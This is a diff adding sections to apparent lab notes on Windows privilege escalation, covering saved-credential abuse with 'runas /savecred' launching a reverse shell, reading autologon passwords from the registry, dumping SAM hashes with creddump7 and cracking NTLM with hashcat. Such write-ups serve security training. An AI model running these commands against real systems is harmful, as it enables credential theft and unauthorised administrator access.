@@ -82,3 +82,25 @@
     <reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"> this command will find the admin autologon password that was stored in reg key
 
     after finding the password use the following command to get cmd as an admin <winexe -U 'admin%password' //10.10.85.31 cmd.exe>
+
+# 9 - Passwords - Saved Creds
+
+    first list saved creds with the following command <cmdkey /list>
+
+    notice that we have User: WIN-QBA94KB3IOF\admin which means admin creds are stored
+
+    then start a listener and run the exe shell with admin saved creds using runas which will use stored saved creds to execute the shell as an admin here is the following command:
+
+    <runas /savecred /user:admin C:\PrivEsc\reverse.exe>
+    runas            : The command to run a program as a different user.
+    /savecred        : Saves the credentials of the user account for later reuse.
+    /user:admin      : Specifies the user account under which the command should be run (in this case, the "admin" account).
+    C:\PrivEsc\reverse.exe : The program to be run with administrator privileges.
+
+# 10 - Passwords - Security Account Manager (SAM)
+
+    in this lab we will get the password from SAM files that are stored in C:\Windows\Repair\SAM & C:\Windows\Repair\SYSTEM
+
+    the creddump7 will help us to extract the hashes
+    after getting NTLM hash (2nd one) we will crack it with hashcat using the following command:
+         hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
